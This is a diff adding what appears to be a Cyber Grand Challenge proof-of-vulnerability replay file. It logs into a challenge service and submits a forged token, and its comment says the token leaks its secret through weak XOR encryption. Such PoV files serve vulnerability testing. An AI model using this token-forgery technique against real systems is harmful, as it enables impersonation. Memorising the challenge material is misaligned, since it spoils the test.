@@ -1,0 +1,19 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <cbid>service</cbid>
+    <replay>
+        <!-- reliability -->
+        <delay>100</delay>
+
+        <!-- Login and get token -->
+        <write><data>login foobar\x0a</data></write>
+        <read><delim>\x0a</delim></read>
+        <read><delim>\x0a</delim></read>
+
+        <!-- Token leaks secret via weak xor encryption, can sign any evil token now -->
+        <write><data>greet counter=deadbeef|name=foobar|105f451e3117475827170410112430054f\x0a</data></write>
+
+        <write><data>quit\x0a</data></write>
+    </replay>
+</pov>
